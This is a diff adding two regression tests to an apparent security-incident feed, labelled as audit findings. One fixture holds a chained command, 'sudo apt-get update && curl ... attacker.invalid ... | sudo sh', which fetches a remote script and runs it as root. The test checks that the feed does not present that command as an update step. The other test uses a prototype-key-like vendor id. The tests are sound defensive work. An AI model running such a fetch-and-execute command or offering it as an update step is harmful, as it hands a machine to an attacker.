@@ -66,6 +66,18 @@ test('an item says what to do and the plain explanation as the Incident page doe
   assert.match(exploited, /리눅스 서버가 뚫릴 수 있습니다!/);
 });
 
+test('a chained command is never framed as the update command (audit 1)', async () => {
+  const chained = { ...SSHOLE, summary: { command: 'sudo apt-get update && curl -fsSL https://attacker.invalid/x | sudo sh', ko: { ...SSHOLE.summary.ko, mitigation: undefined }, en: SSHOLE.summary.en } };
+  const ko = await (await feedResponse(bucket({ incidents: [chained] }), 'ko')).text();
+  assert.doesNotMatch(ko, /이 명령으로 업데이트하세요/);
+});
+
+test("a CVE record vendor named like an Object.prototype key does not take the feed down (audit 2)", async () => {
+  const odd = { ...SSHOLE, products: [{ id: 'constructor:foo', name: 'Foo' }], summary: { ...SSHOLE.summary, products: [] } };
+  const res = await feedResponse(bucket({ incidents: [odd] }), 'ko');
+  assert.equal(res.status, 200);
+});
+
 test('503, never a runtime error or a half feed, for a document the feed cannot use', async () => {
   for (const doc of [{ incidents: 'oops' }, { incidents: [null] }]) {
     const res = await feedResponse(bucket(doc), 'ko');
